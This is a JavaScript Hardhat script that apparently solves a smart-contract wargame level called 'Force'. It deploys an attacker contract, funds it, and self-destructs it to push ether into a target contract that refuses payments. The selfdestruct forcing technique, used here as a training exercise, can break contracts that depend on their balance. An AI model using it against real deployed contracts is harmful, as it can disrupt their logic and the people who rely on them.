const { ethers } = require("hardhat");

const FORCE_CONTRACT_NAME = "Force";
const FORCE_CONTRACT_ADDRESS = "0x1a1D61d8e1110C892DbD4ECaeA06362804BF175c";
const FORCE_ATTACKER_CONTRACT_NAME = "Force_Attacker";

// const FORCE_ATTACKER_CONTRACT_ADDRESS = "0x9Ec94788F5AaEAb3867130bE843930ca46E031cB"; --> Destroyed Contract Address

async function main() {
    const forceFactory = await ethers.getContractFactory(FORCE_CONTRACT_NAME);
    const forceContract = forceFactory.attach(FORCE_CONTRACT_ADDRESS);

    const attackerFactory = await ethers.getContractFactory(FORCE_ATTACKER_CONTRACT_NAME);
    const attackerContract = await attackerFactory.deploy();
    await attackerContract.waitForDeployment();

    const FORCE_ATTACKER_CONTRACT_ADDRESS = await attackerContract.getAddress();
    console.log("Attacker Contract Deployed at: ", FORCE_ATTACKER_CONTRACT_ADDRESS);

    // Send some eth to the attacker contract
    const [attacker] = await ethers.getSigners();
    const tx = await attacker.sendTransaction({
        to: await attackerContract.getAddress(),
        value: 10000,
    });
    await tx.wait();

    console.log("Balance of Attacker Contract Before Destruction: ", await attackerContract.getBalance(FORCE_ATTACKER_CONTRACT_ADDRESS));
    console.log("Balance of Force Contract Before Destruction: : ", await attackerContract.getBalance(FORCE_CONTRACT_ADDRESS));

    // Destroy the Attacker Contract to Transfer balance to receipent
    const tx2 = await attackerContract.destroy(FORCE_CONTRACT_ADDRESS);
    await tx2.wait();
    console.log("Attacker Contract destroyed and funds moved to Force Contract. Check in Explorer");
}

main().catch(error => {
    console.error(error);
    process.exit(1);
})